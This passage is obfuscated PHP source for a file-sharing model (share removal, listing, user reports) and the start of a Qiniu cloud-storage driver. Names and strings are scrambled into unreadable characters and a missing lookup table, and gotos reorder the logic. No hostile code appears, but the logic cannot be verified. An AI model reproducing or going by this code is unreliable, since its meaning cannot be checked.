$DŠ÷”Âñ‡[47]))); $a‰ÇµéªÍ = Model($DŠ÷”Âñ‡[766])->where($eÎÏ–ËªËÒ)->field($DŠ÷”Âñ‡[28])->select(); goto FÅèµä‹»è; FÅèµä‹»è: $C¤Éïñã å = array_to_keyvalue($a‰ÇµéªÍ, $DŠ÷”Âñ‡[33], $DŠ÷”Âñ‡[28]); $C¤Éïñã å[] = $DíÔÅ·ï‹¡[$DŠ÷”Âñ‡[28]]; return implode($DŠ÷”Âñ‡[8], $C¤Éïñã å); goto C½ªòê™ˆ; FéÓ×ï‡‘: $eÎÏ–ËªËÒ = array($DŠ÷”Âñ‡[427] => array($DŠ÷”Âñ‡[7], $cô’¨œîšœ), $DŠ÷”Âñ‡[467] => array($DŠ÷”Âñ‡[765], "\45{$d²îåóº¹à}\45"), $DŠ÷”Âñ‡[405] => 0); $DíÔÅ·ï‹¡ = Model($DŠ÷”Âñ‡[766])->where($eÎÏ–ËªËÒ)->field($DŠ÷”Âñ‡[2242])->find(); if (!$DíÔÅ·ï‹¡) { return !1; } goto Bø“ëª‘ö; C½ªòê™ˆ: } protected function remove($Dî¿ƒêæ¼•) { goto d¿¶Êƒßçò; d¿¶Êƒßçò: $c¹ùê£»Ç =& $_SERVER[¶ªÕß‚ØÁŸ]; if (is_array($Dî¿ƒêæ¼•)) { $Dî¿ƒêæ¼• = array($c¹ùê£»Ç[7], $Dî¿ƒêæ¼•); } $B¯ê‡¢±§» = array($c¹ùê£»Ç[449] => $Dî¿ƒêæ¼•); goto Ašæ²ÒÏ³“; Ašæ²ÒÏ³“: $DÙó¥ƒÜù = $this->where($B¯ê‡¢±§»)->delete(); if ($DÙó¥ƒÜù) { Model($c¹ùê£»Ç[545])->where(array($c¹ùê£»Ç[449] => $Dî¿ƒêæ¼•))->delete(); } $CìóÎÄâ¸— = is_array($Dî¿ƒêæ¼•) ? $Dî¿ƒêæ¼•[1] : array($Dî¿ƒêæ¼•); goto E‚¼¼ è©; E‚¼¼ è©: for ($a¯Ô“•ğï¨ = 0; $a¯Ô“•ğï¨ < count($CìóÎÄâ¸—); $a¯Ô“•ğï¨++) { $C–ÔÁÖÑº¨ = $this->getInfo($CìóÎÄâ¸—[$a¯Ô“•ğï¨]); if ($C–ÔÁÖÑº¨[$c¹ùê£»Ç[456]] == $c¹ùê£»Ç[93]) { Model($c¹ùê£»Ç[513])->eventShare($C–ÔÁÖÑº¨[$c¹ùê£»Ç[377]], $c¹ùê£»Ç[2228]); } if ($C–ÔÁÖÑº¨[$c¹ùê£»Ç[454]] == $c¹ùê£»Ç[93]) { Model($c¹ùê£»Ç[513])->eventShare($C–ÔÁÖÑº¨[$c¹ùê£»Ç[377]], $c¹ùê£»Ç[2227]); } } return $DÙó¥ƒÜù; goto CíØ‰ŠĞ±š; CíØ‰ŠĞ±š: } protected function removeBySource($E•¥¦ò‘÷) { goto aŠº‡åÊ; Eä¤ß¤¿¿Ò: $aÁ¤£ØÜ = array_to_keyvalue($aÁ¤£ØÜ, $c‡âñ“À­¸[33], $c‡âñ“À­¸[449]); if (!$aÁ¤£ØÜ) { return; } $Dß‰³Ãê¸æ = array($c‡âñ“À­¸[448] => array($c‡âñ“À­¸[392], $aÁ¤£ØÜ)); goto d‰Ñçî©õ­; aŠº‡åÊ: $c‡âñ“À­¸ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Dß‰³Ãê¸æ = array($c‡âñ“À­¸[391] => array($c‡âñ“À­¸[392], $E•¥¦ò‘÷)); $aÁ¤£ØÜ = $this->field($c‡âñ“À­¸[449])->where($Dß‰³Ãê¸æ)->select(); goto Eä¤ß¤¿¿Ò; d‰Ñçî©õ­: $this->where($Dß‰³Ãê¸æ)->delete(); Model($c‡âñ“À­¸[545])->where($Dß‰³Ãê¸æ)->delete(); goto Bå¶ÄÆ…; Bå¶ÄÆ…: } public function listAll($eáå‹¨ÃèÌ) { goto CÓ¹àŠ¥; Cî‰È‰ËØ: return $EŞÇ†æ›³·; goto a§¼£´¢‹¥; d¢Çå¤à½: $EŞÇ†æ›³· = $this->_makeOrder()->where($B¨„¦¦´¬‰)->selectPage(20); if (empty($EŞÇ†æ›³·[$Eõí‡³‡· [363]])) { return array(); } $this->_listDataApply($EŞÇ†æ›³·[$Eõí‡³‡· [363]]); goto Cî‰È‰ËØ; BÃ¶À¤Ø²: if ($eáå‹¨ÃèÌ[$Eõí‡³‡· [715]]) { $cİ¬‚À¢ä = $eáå‹¨ÃèÌ[$Eõí‡³‡· [716]] ? $eáå‹¨ÃèÌ[$Eõí‡³‡· [716]] : strtotime(date($Eõí‡³‡· [2243])); $B¨„¦¦´¬‰[$Eõí‡³‡· [197]] = array($Eõí‡³‡· [330], array($eáå‹¨ÃèÌ[$Eõí‡³‡· [715]], $cİ¬‚À¢ä)); } if ($eáå‹¨ÃèÌ[$Eõí‡³‡· [29]]) { $B¨„¦¦´¬‰[$eáå‹¨ÃèÌ[$Eõí‡³‡· [29]]] = 1; } else { $B¨„¦¦´¬‰[] = array($Eõí‡³‡· [454] => array($Eõí‡³‡· [932], 0), $Eõí‡³‡· [456] => array($Eõí‡³‡· [932], 0), $Eõí‡³‡· [2218] => $Eõí‡³‡· [2187]); } if ($eáå‹¨ÃèÌ[$Eõí‡³‡· [2183]]) { $B¨„¦¦´¬‰[] = array($Eõí‡³‡· [451] => $eáå‹¨ÃèÌ[$Eõí‡³‡· [2183]], $Eõí‡³‡· [1346] => array($Eõí‡³‡· [765], "\x25{$eáå‹¨ÃèÌ[$Eõí‡³‡· [2183]]}\x25"), $Eõí‡³‡· [2218] => $Eõí‡³‡· [2187]); } goto d¢Çå¤à½; CÓ¹àŠ¥: $Eõí‡³‡·  =& $_SERVER[¶ªÕß‚ØÁŸ]; $B¨„¦¦´¬‰ = array(); if ($eáå‹¨ÃèÌ[$Eõí‡³‡· [1440]]) { $B¨„¦¦´¬‰[$Eõí‡³‡· [1440]] = $eáå‹¨ÃèÌ[$Eõí‡³‡· [1440]]; } goto BÃ¶À¤Ø²; a§¼£´¢‹¥: } public function listDataApply($dö·ÆºŠóÀ) { $this->_listDataApply($dö·ÆºŠóÀ); return $dö·ÆºŠóÀ; } private function _listDataApply(&$e»´„¼ó±¤) { $C¢„îâ™„ =& $_SERVER[¶ªÕß‚ØÁŸ]; $D›ã¦†Ù˜ = array_to_keyvalue($e»´„¼ó±¤, $C¢„îâ™„[33], $C¢„îâ™„[1440]); $f¿ÃµèÍ† = Model($C¢„îâ™„[485])->userListInfo(array_unique($D›ã¦†Ù˜)); $CœÓ”»İèó = array_to_keyvalue($e»´„¼ó±¤, $C¢„îâ™„[33], $C¢„îâ™„[377]); $E¯…âªÚÖë = Model($C¢„îâ™„[766])->sourceListInfo($CœÓ”»İèó, !0); foreach ($e»´„¼ó±¤ as &$bòÛˆŠÜ™) { $fÏó­¸ÈòÌ = $bòÛˆŠÜ™[$C¢„îâ™„[1440]]; $bòÛˆŠÜ™[$C¢„îâ™„[2244]] = $f¿ÃµèÍ†[$fÏó­¸ÈòÌ] ? $f¿ÃµèÍ†[$fÏó­¸ÈòÌ] : !1; $A°µ‰ï = $bòÛˆŠÜ™[$C¢„îâ™„[377]]; $bòÛˆŠÜ™[$C¢„îâ™„[399]] = $E¯…âªÚÖë[$A°µ‰ï] ? $E¯…âªÚÖë[$A°µ‰ï] : !1; } } private function _makeOrder($DÚÃœˆ‚ = '') { goto Aâç©ñĞÃŞ; Bíï’êäÌå: $D§­”³„‰ƒ = Input::get($FÊà†âÁÃ[415], $FÊà†âÁÃ[7], $FÊà†âÁÃ[397], $dÜø×ËµÔ); $FºÈø‚Ìì = Input::get($FÊà†âÁÃ[416], $FÊà†âÁÃ[7], $FÊà†âÁÃ[2245], array($FÊà†âÁÃ[2182], $FÊà†âÁÃ[412])); $FºÈø‚Ìì = $Aª¿åÍÏÕÄ[$FºÈø‚Ìì]; goto D’¦–ˆÊ„ƒ; Aâç©ñĞÃŞ: $FÊà†âÁÃ =& $_SERVER[¶ªÕß‚ØÁŸ]; $dÜø×ËµÔ = array($FÊà†âÁÃ[197], $FÊà†âÁÃ[716], $FÊà†âÁÃ[2230], $FÊà†âÁÃ[2231]); $Aª¿åÍÏÕÄ = array($FÊà†âÁÃ[410] => $FÊà†âÁÃ[411], $FÊà†âÁÃ[412] => $FÊà†âÁÃ[413]); goto Bíï’êäÌå; D’¦–ˆÊ„ƒ: $DÚÃœˆ‚ = $DÚÃœˆ‚ . "{$D§­”³„‰ƒ}\40{$FºÈø‚Ìì}"; return $this->order($DÚÃœˆ‚); goto D„¦©ÒÊßó; D„¦©ÒÊßó: } public function reportAdd($BÁ‘ÕÔÈº‡) { $D‰÷©†”Ê =& $_SERVER[¶ªÕß‚ØÁŸ]; $f‹®ĞºÈ÷¸ = array($D‰÷©†”Ê[449] => $BÁ‘ÕÔÈº‡[$D‰÷©†”Ê[449]], $D‰÷©†”Ê[1440] => USER_ID); if (Model($D‰÷©†”Ê[2241])->where($f‹®ĞºÈ÷¸)->find()) { return !1; } $C—ôŞæ‚ã = array($D‰÷©†”Ê[449] => $BÁ‘ÕÔÈº‡[$D‰÷©†”Ê[449]], $D‰÷©†”Ê[1346] => $BÁ‘ÕÔÈº‡[$D‰÷©†”Ê[1346]], $D‰÷©†”Ê[377] => $BÁ‘ÕÔÈº‡[$D‰÷©†”Ê[377]], $D‰÷©†”Ê[427] => $BÁ‘ÕÔÈº‡[$D‰÷©†”Ê[427]], $D‰÷©†”Ê[1440] => USER_ID, $D‰÷©†”Ê[29] => $BÁ‘ÕÔÈº‡[$D‰÷©†”Ê[29]], $D‰÷©†”Ê[413] => $BÁ‘ÕÔÈº‡[$D‰÷©†”Ê[413]]); return Model($D‰÷©†”Ê[2241])->add($C—ôŞæ‚ã); } public function reportList($F—Ììùß¤) { goto fŞŠ´…”‚Ú; aæ–ÒÈ£: if (isset($F—Ììùß¤[$AìŒëÚìæ[29]]) && in_array($F—Ììùß¤[$AìŒëÚìæ[29]], array($AìŒëÚìæ[93], $AìŒëÚìæ[2246], $AìŒëÚìæ[2247], $AìŒëÚìæ[2248], $AìŒëÚìæ[1923]))) { $BƒÍœÀÍÒŠ[$AìŒëÚìæ[29]] = $F—Ììùß¤[$AìŒëÚìæ[29]]; } if (isset($F—Ììùß¤[$AìŒëÚìæ[702]]) && in_array($F—Ììùß¤[$AìŒëÚìæ[702]], array($AìŒëÚìæ[476], $AìŒëÚìæ[93], $AìŒëÚìæ[2246], $AìŒëÚìæ[2247]))) { $BƒÍœÀÍÒŠ[$AìŒëÚìæ[702]] = $F—Ììùß¤[$AìŒëÚìæ[702]]; } $bÔ‘‘¿«Š = Input::get($AìŒëÚìæ[416], $AìŒëÚìæ[7], $AìŒëÚìæ[2245], array($AìŒëÚìæ[2182], $AìŒëÚìæ[412])); goto bŒøâŒÊİ£; fŞŠ´…”‚Ú: $AìŒëÚìæ =& $_SERVER[¶ªÕß‚ØÁŸ]; $BƒÍœÀÍÒŠ = array(); if ($F—Ììùß¤[$AìŒëÚìæ[715]]) { $dñÑ×‚ÓÚ‰ = $F—Ììùß¤[$AìŒëÚìæ[716]] ? $F—Ììùß¤[$AìŒëÚìæ[716]] : strtotime(date($AìŒëÚìæ[2243])); $BƒÍœÀÍÒŠ[$AìŒëÚìæ[197]] = array($AìŒëÚìæ[330], array($F—Ììùß¤[$AìŒëÚìæ[715]], $dñÑ×‚ÓÚ‰)); } goto aæ–ÒÈ£; e¿À»áœŞÂ: if (empty($cÕíËÂìùç[$AìŒëÚìæ[363]])) { return array(); } $this->_listDataApply($cÕíËÂìùç[$AìŒëÚìæ[363]]); return $cÕíËÂìùç; goto aø©À°Û½; bŒøâŒÊİ£: $E»¬½Ûš“õ = array($AìŒëÚìæ[410] => $AìŒëÚìæ[411], $AìŒëÚìæ[412] => $AìŒëÚìæ[413]); $aõåÏŸÑ¶º = $AìŒëÚìæ[2249] . $E»¬½Ûš“õ[$bÔ‘‘¿«Š]; $cÕíËÂìùç = Model($AìŒëÚìæ[2241])->where($BƒÍœÀÍÒŠ)->order($aõåÏŸÑ¶º)->selectPage(20); goto e¿À»áœŞÂ; aø©À°Û½: } public function reportStatus($b„ù¢Ğœ¦) { goto E„ÙÉ§ ŞŠ; eäÊº”åâô: if (!$a†½ØÚë©ø) { return !1; } $fÛ¡‹ç«à = array($c¨¼†Ç¡Œå[702] => $b„ù¢Ğœ¦[$c¨¼†Ç¡Œå[702]]); if ($b„ù¢Ğœ¦[$c¨¼†Ç¡Œå[702]] == $c¨¼†Ç¡Œå[2247] && $a†½ØÚë©ø[$c¨¼†Ç¡Œå[702]] == $c¨¼†Ç¡Œå[2247]) { $fÛ¡‹ç«à[$c¨¼†Ç¡Œå[702]] = 0; } goto A¿Òœñê›Æ; A¿Òœñê›Æ: $Bé¹å¸ËÜğ = Model($c¨¼†Ç¡Œå[2241])->where($CŠÆá™ ğ†)->save($fÛ¡‹ç«à); if ($b„ù¢Ğœ¦[$c¨¼†Ç¡Œå[702]] == $c¨¼†Ç¡Œå[2246]) { if ($a†½ØÚë©ø[$c¨¼†Ç¡Œå[427]] != $c¨¼†Ç¡Œå[476] && $this->shareFileMeta($a†½ØÚë©ø[$c¨¼†Ç¡Œå[427]])) { $this->shareFileMeta($a†½ØÚë©ø[$c¨¼†Ç¡Œå[427]], 0); } $this->remove($a†½ØÚë©ø[$c¨¼†Ç¡Œå[449]]); return !0; } if ($Bé¹å¸ËÜğ && $b„ù¢Ğœ¦[$c¨¼†Ç¡Œå[702]] == $c¨¼†Ç¡Œå[2247]) { $a½ÆÉÂ¸ã = $fÛ¡‹ç«à[$c¨¼†Ç¡Œå[702]] == $c¨¼†Ç¡Œå[2247] ? 1 : 0; $this->shareFileMeta($a†½ØÚë©ø[$c¨¼†Ç¡Œå[427]], $a½ÆÉÂ¸ã); $this->removeByFile($a†½ØÚë©ø[$c¨¼†Ç¡Œå[427]]); } goto bÆ¾‹±”œ­; bÆ¾‹±”œ­: return $Bé¹å¸ËÜğ; goto e• ÆìÀÕ¨; E„ÙÉ§ ŞŠ: $c¨¼†Ç¡Œå =& $_SERVER[¶ªÕß‚ØÁŸ]; $CŠÆá™ ğ† = array($c¨¼†Ç¡Œå[375] => $b„ù¢Ğœ¦[$c¨¼†Ç¡Œå[375]]); $a†½ØÚë©ø = Model($c¨¼†Ç¡Œå[2241])->where($CŠÆá™ ğ†)->field($c¨¼†Ç¡Œå[2250])->find(); goto eäÊº”åâô; e• ÆìÀÕ¨: } private function removeByFile($Cº“Ç–¿¿¥) { goto aÑÀ“•Ê‹; eª·¶šµè÷: $A‰¹ÊÒÀ§§ = array($cÃ£ÉÀ«ëé[377] => array($cÃ£ÉÀ«ëé[7], $c½È£Ş·Æ), $cÃ£ÉÀ«ëé[454] => 1); $EÅã·¤¨±Â = Model($cÃ£ÉÀ«ëé[2084])->where($A‰¹ÊÒÀ§§)->field($cÃ£ÉÀ«ëé[449])->select(); if (empty($EÅã·¤¨±Â)) { return; } goto B¼Ãà”Ö„Ä; B¼Ãà”Ö„Ä: $eË÷ë„”ëè = array_to_keyvalue($EÅã·¤¨±Â, $cÃ£ÉÀ«ëé[33], $cÃ£ÉÀ«ëé[449]); $this->remove($eË÷ë„”ëè); goto a¿Šç¦¾Å; aÑÀ“•Ê‹: $cÃ£ÉÀ«ëé =& $_SERVER[¶ªÕß‚ØÁŸ]; $EÅã·¤¨±Â = Model($cÃ£ÉÀ«ëé[766])->where(array($cÃ£ÉÀ«ëé[427] => $Cº“Ç–¿¿¥))->field($cÃ£ÉÀ«ëé[377])->select(); $c½È£Ş·Æ = array_to_keyvalue($EÅã·¤¨±Â, $cÃ£ÉÀ«ëé[33], $cÃ£ÉÀ«ëé[377]); goto eª·¶šµè÷; a¿Šç¦¾Å: } private function shareFileMeta($DÅØà¨òÖ, $CÛŠíÃ‡Èˆ = null) { $eö¢“Ğ‡—õ =& $_SERVER[¶ªÕß‚ØÁŸ]; $c®¨ùÄ™ÃÒ = array($eö¢“Ğ‡—õ[427] => $DÅØà¨òÖ, $eö¢“Ğ‡—õ[99] => $eö¢“Ğ‡—õ[2251]); if (is_null($CÛŠíÃ‡Èˆ)) { return Model($eö¢“Ğ‡—õ[2252])->where($c®¨ùÄ™ÃÒ)->find(); } $c®¨ùÄ™ÃÒ[$eö¢“Ğ‡—õ[368]] = $CÛŠíÃ‡Èˆ; Model($eö¢“Ğ‡—õ[2252])->add($c®¨ùÄ™ÃÒ, array(), !0); } } goto f«æ˜öƒÒ; BÖ’‡ã¨Ü: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($Dè×ŒÌÂ…”) { parent::__construct(); require_once SDK_DIR . $_SERVER[¶ªÕß‚ØÁŸ][1215]; $this->_init($Dè×ŒÌÂ…”); } public function _init($EƒÔñòš¹¶) { foreach ($EƒÔñòš¹¶ as $FÇË¤Î•Ú· => $E‚ö´§à¥) { if (isset($this->{$FÇË¤Î•Ú·})) { $this->{$FÇË¤Î•Ú·} = $E‚ö´§à¥; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[¶ªÕß‚ØÁŸ][1216], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Bñ¯Æ†´Ş¼, $D‚Ï×¢ãÆ¶ = '', $aÉŠß¤Ñ½ = REPEAT_RENAME) { if ($this->setContent($Bñ¯Æ†´Ş¼, $D‚Ï×¢ãÆ¶)) { return $this->getPathOuter($Bñ¯Æ†´Ş¼); } return !1; } public function mkdir($D©Ùï­ÖÙ, $D±»ÂÍëº¾ = REPEAT_SKIP) { goto d£ù·«ÕÕ; d£ù·«ÕÕ: $A–à¹¹ÓÒ =& $_SERVER[¶ªÕß‚ØÁŸ]; $a¹†¶ºœ¯¿ = trim($D©Ùï­ÖÙ, $A–à¹¹ÓÒ[8]); if ($this->_isFolder($a¹†¶ºœ¯¿)) { return $this->getPathOuter($a¹†¶ºœ¯¿); } goto E„İ£§×İ; eÄ¾ôšŞœ: if (!$this->mkfile($d‡‘‹ˆÓº)) { return !1; } if (!$this->moveFile($d‡‘‹ˆÓº, $D©Ùï­ÖÙ)) { $this->delFile($d‡‘‹ˆÓº); return !1; } return $this->getPathOuter($a¹†¶ºœ¯¿); goto Bˆãá¾êµÚ; E„İ£§×İ: $D©Ùï­ÖÙ = $a¹†¶ºœ¯¿ . $A–à¹¹ÓÒ[8]; $fğ™Îİ³Ù = get_path_this($a¹†¶ºœ¯¿); $d‡‘‹ˆÓº = $D©Ùï­ÖÙ . $fğ™Îİ³Ù; goto eÄ¾ôšŞœ; Bˆãá¾êµÚ: } public function copyFile($dÆ‘’›ìÃ, $F¤´ÇŒ‚Ì) { $AëÍ¾ØóÔ‰ = $this->bucketManager->copy($this->bucket, $dÆ‘’›ìÃ, $this->bucket, $F¤´ÇŒ‚Ì, !0); return $AëÍ¾ØóÔ‰ ? !1 : !0; } public function moveFile($BÔ©‹Á, $Dğò»é‰î) { $A¥‰«Œ³ã = $this->bucketManager->move($this->bucket, $BÔ©‹Á, $this->bucket, $Dğò»é‰î, !0); return $A¥‰«Œ³ã ? !1 : !0; } public function delFile($câ†÷™êŸ˜) { $fÅù’Ê§ä = $this->bucketManager->delete($this->bucket, $câ†÷™êŸ˜); return $fÅù’Ê§ä ? !1 : !0; } public function delFolder($E÷ØÒ„µÁš) { $A‚è÷“ØĞá = $this->fileList($E÷ØÒ„µÁš); if (empty($A‚è÷“ØĞá)) { return !0; } $ašØ¯èŸ¬Õ = 1000; if (count($A‚è÷“ØĞá) <= $ašØ¯èŸ¬Õ) { return $this->qnDelObj($A‚è÷“ØĞá) ? !1 : !0; } foreach (array_chunk($A‚è÷“ØĞá, $ašØ¯èŸ¬Õ) as $Bíá›£Ùåà) { $DĞ¥ñÃÄ¤ = $this->qnDelObj($Bíá›£Ùåà); if ($DĞ¥ñÃÄ¤) { return !1; } } return !0; } private function qnDelObj($Céƒã­¸Ê) { $F…¿¿¿…İ™ = $this->bucketManager->buildBatchDelete($this->bucket, $Céƒã­¸Ê); list($b•£œÛ¥Ü, $cáÕÕÙ¼ô) = $this->bucketManager->batch($F…¿¿¿…İ™); return $cáÕÕÙ¼ô; } private function fileList($dÖ…¢‚øÉŸ, $B‚…­ÂŠë = 0) { goto Aä®¦¶£‹; eÅ§ÍÄºø´: $bÒÑ‰¬ÔŠÆ = array(); while (!0) { list($E£²”Ó“‘ß, $e¨õŸ¿Š‰) = $this->bucketManager->listFiles($this->bucket, $Eò¥ÅˆÚºà, $cĞ’Œ‰¬ä, $d¦ò¯öëŒÖ, $e˜á²¿˜¦³); if ($e¨õŸ¿Š‰) { return !1; } $cĞ’Œ‰¬ä = array_key_exists($cœÃëŒäòù[1186], $E£²”Ó“‘ß) ? $cĞ’Œ‰¬ä = $E£²”Ó“‘ß[$cœÃëŒäòù[1217]] : $cœÃëŒäòù[33]; foreach ($E£²”Ó“‘ß[$cœÃëŒäòù[1218]] as $c”¥‡Ü’‰Ù) { $Có³ÇØ‘¾ = $c”¥‡Ü’‰Ù[$cœÃëŒäòù[99]]; if ($B‚…­ÂŠë) { $Có³ÇØ‘¾ = array($cœÃëŒäòù[28] => $Có³ÇØ‘¾, $cœÃëŒäòù[87] => $c”¥‡Ü’‰Ù[$cœÃëŒäòù[1219]]); } $bÒÑ‰¬ÔŠÆ[] = $Có³ÇØ‘¾; } if ($cĞ’Œ‰¬ä == $cœÃëŒäòù[33]) { break; } } return $bÒÑ‰¬ÔŠÆ; goto CØ“—ÑÄöå; b¿Ù”é£”ø: $cĞ’Œ‰¬ä = $cœÃëŒäòù[33]; $d¦ò¯öëŒÖ = 1000; $e˜á²¿˜¦³ = $cœÃëŒäòù[33]; goto eÅ§ÍÄºø´; Aä®¦¶£‹: $cœÃëŒäòù =& $_SERVER[¶ªÕß‚ØÁŸ]; $dÖ…¢‚øÉŸ = trim($dÖ…¢‚øÉŸ, $cœÃëŒäòù[8]); $Eò¥ÅˆÚºà = empty($dÖ…¢‚øÉŸ) ? $cœÃëŒäòù[33] : $dÖ…¢‚øÉŸ . $cœÃëŒäòù[8]; goto b¿Ù”é£”ø; CØ“—ÑÄöå: } public function rename($d¾Š‡íÌªŠ, $bÊ£Ö¨‰ÙÃ) { return $this->renameObject($d¾Š‡íÌªŠ, $bÊ£Ö¨‰ÙÃ); } public function fileInfo($Fä³ßÏ›§·, $eÆˆ²¥ôô = false, $a¸Ö…àó› = array()) { goto DŒˆšÕ‰Ÿ; AÀÂªš¯ˆ: if (empty($a¸Ö…àó›)) { $a¸Ö…àó› = $this->objectMeta($Fä³ßÏ›§·); if (!$a¸Ö…àó›) { return $c‚Ôâ’¡Å½; } } if (isset($a¸Ö…àó›[$a½‹œí¬»ã[1220]])) { $c‚Ôâ’¡Å½[$a½‹œí¬»ã[197]] = $a¸Ö…àó›[$a½‹œí¬»ã[1220]]; } if (isset($a¸Ö…àó›[$a½‹œí¬»ã[1219]])) { $c‚Ôâ’¡Å½[$a½‹œí¬»ã[87]] = $a¸Ö…àó›[$a½‹œí¬»ã[1219]]; } goto Aç‚äŸ¶œ; DŒˆšÕ‰Ÿ: $a½‹œí¬»ã =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($eÆˆ²¥ôô) { return array($a½‹œí¬»ã[28] => $this->pathThis($Fä³ßÏ›§·), $a½‹œí¬»ã[85] => $this->getPathOuter($a½‹œí¬»ã[8] . $Fä³ßÏ›§·), $a½‹œí¬»ã[29] => $a½‹œí¬»ã[177], $a½‹œí¬»ã[87] => isset($a¸Ö…àó›[$a½‹œí¬»ã[1219]]) ? $a¸Ö…àó›[$a½‹œí¬»ã[1219]] : 0, $a½‹œí¬»ã[170] => $this->ext($Fä³ßÏ›§·)); } $c‚Ôâ’¡Å½ = array($a½‹œí¬»ã[28] => $this->pathThis($Fä³ßÏ›§·), $a½‹œí¬»ã[85] => $this->getPathOuter($a½‹œí¬»ã[8] . $Fä³ßÏ›§·), $a½‹œí¬»ã[29] => $a½‹œí¬»ã[177], $a½‹œí¬»ã[197] => 0, $a½‹œí¬»ã[117] => 0, $a½‹œí¬»ã[87] => 0, $a½‹œí¬»ã[170] => $this->ext($Fä³ßÏ›§·), $a½‹œí¬»ã[198] => !0, $a½‹œí¬»ã[199] => !0); goto AÀÂªš¯ˆ; Aç‚äŸ¶œ: return $c‚Ôâ’¡Å½; goto FÃ‚¹‚»­; FÃ‚¹‚»­: } public function folderInfo($Dœ†ê«¦§š, $F¡£ˆ‘Ş„“ = false) { goto aÉáãÖ³Û; d±¡æÈ­®: return $b¢ÌÄ„íÆ¤; goto A‘îİ‰ğë´; B¡ ĞÆÊ©: $Dœ†ê«¦§š = rtrim($Dœ†ê«¦§š, $A÷š•ÈÎÒÔ[8]) . $A÷š•ÈÎÒÔ[8]; $DÃğâğÌ÷ = $this->objectMeta($Dœ†ê«¦§š); if (isset($DÃğâğÌ÷[$A÷š•ÈÎÒÔ[1220]])) { $b¢ÌÄ„íÆ¤[$A÷š•ÈÎÒÔ[197]] = $DÃğâğÌ÷[$A÷š•ÈÎÒÔ[1220]]; } goto d±¡æÈ­®; aÉáãÖ³Û: $A÷š•ÈÎÒÔ =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($F¡£ˆ‘Ş„“) { return array($A÷š•ÈÎÒÔ[28] => $this->pathThis($Dœ†ê«¦§š), $A÷š•ÈÎÒÔ[85] => $this->getPathOuter($A÷š•ÈÎÒÔ[8] . $Dœ†ê«¦§š), $A÷š•ÈÎÒÔ[29] => $A÷š•ÈÎÒÔ[86]); } $b¢ÌÄ„íÆ¤ = array($A÷š•ÈÎÒÔ[28] => $this->pathThis($Dœ†ê«¦§š), $A÷š•ÈÎÒÔ[85] => $this->getPathOuter($A÷š•ÈÎÒÔ[8] . $Dœ†ê«¦§š), $A÷š•ÈÎÒÔ[29] => $A÷š•ÈÎÒÔ[86], $A÷š•ÈÎÒÔ[197] => 0, $A÷š•ÈÎÒÔ[117] => 0, $A÷š•ÈÎÒÔ[1165] => !0, $A÷š•ÈÎÒÔ[1166] => !0); goto B¡ ĞÆÊ©; A‘îİ‰ğë´: } public function listPath($aÅ…’ôì¾…, $CÒ¿ºô˜“ê = false) { goto AãÏœÓëªŒ; AãÏœÓëªŒ: $FÑêÒŸìÎ… =& $_SERVER[¶ªÕß‚ØÁŸ]; $aÅ…’ôì¾… = trim($aÅ…’ôì¾…, $FÑêÒŸìÎ…[8]); $eùÒñ“¿ö® = empty($aÅ…’ôì¾…) ? $FÑêÒŸìÎ…[33] : $aÅ…’ôì¾… . $FÑêÒŸìÎ…[8]; goto FŒá—ôÒ‘; d›Û»‡ÒĞë: $C† ³£ÊŞ‡ = $E½õòîÕÜÙ = array(); while (!0) { list($AëÔØÈö”, $E›©ğŒ¸•‹) = $this->bucketManager->listFiles($this->bucket, $eùÒñ“¿ö®, $cÛœ©›Ğ¼Œ, $D†‡ŞìÄ·®, $cïÈíÖŸ´); if ($E›©ğŒ¸•‹) { return !1; } $cÛœ©›Ğ¼Œ = array_key_exists($FÑêÒŸìÎ…[1186], $AëÔØÈö”) ? $cÛœ©›Ğ¼Œ = $AëÔØÈö”[$FÑêÒŸìÎ…[1217]] : $FÑêÒŸìÎ…[33]; if (isset($AëÔØÈö”[$FÑêÒŸìÎ…[1221]])) { foreach ($AëÔØÈö”[$FÑêÒŸìÎ…[1221]] as $f¡ô–Ò„Ÿ‡) { if ($f¡ô–Ò„Ÿ‡ == $eùÒñ“¿ö®) { continue; } $C† ³£ÊŞ‡[] = $this->folderInfo($f¡ô–Ò„Ÿ‡, $CÒ¿ºô˜“ê); } } if (isset($AëÔØÈö”[$FÑêÒŸìÎ…[1218]])) { foreach ($AëÔØÈö”[$FÑêÒŸìÎ…[1218]] as $cù«ßèÕùË) { if ($cù«ßèÕùË[$FÑêÒŸìÎ…[99]] == $eùÒñ“¿ö®) { continue; } $E½õòîÕÜÙ[] = $this->fileInfo($cù«ßèÕùË[$FÑêÒŸìÎ…[99]], $CÒ¿ºô˜“ê, $cù«ßèÕùË); } } if ($cÛœ©›Ğ¼Œ == $FÑêÒŸìÎ…[33]) { break; } } return array($FÑêÒŸìÎ…[84] => $C† ³£ÊŞ‡, $FÑêÒŸìÎ…[83] => $E½õòîÕÜÙ); goto F“„ÌãÑí; FŒá—ôÒ‘: $cÛœ©›Ğ¼Œ = $FÑêÒŸìÎ…[33]; $D†‡ŞìÄ·® = 1000; $cïÈíÖŸ´ = $FÑêÒŸìÎ…[8]; goto d›Û»‡ÒĞë; F“„ÌãÑí: } public function has($D¡ª‚‚“ÚË, $cÏ…æŸ¨Ã” = false, $b›“êàƒÑÂ = true) { goto AÁÑÉ¸ÆĞÄ; AÁÑÉ¸ÆĞÄ: $a®ŸÙóìº =& $_SERVER[¶ªÕß‚ØÁŸ]; $D¡ª‚‚“ÚË = trim($D¡ª‚‚“ÚË, $a®ŸÙóìº[8]); $C‰Ğƒ„ƒà = empty($D¡ª‚‚“ÚË) ? $a®ŸÙóìº[33] : $D¡ª‚‚“ÚË . $a®ŸÙóìº[8]; goto e÷Åå«†Û; a˜ÊëĞ†®Ğ: $EÏ¤ïË¶»Î = 0; $c…¹†ÁÓ = 0; while (!0) { 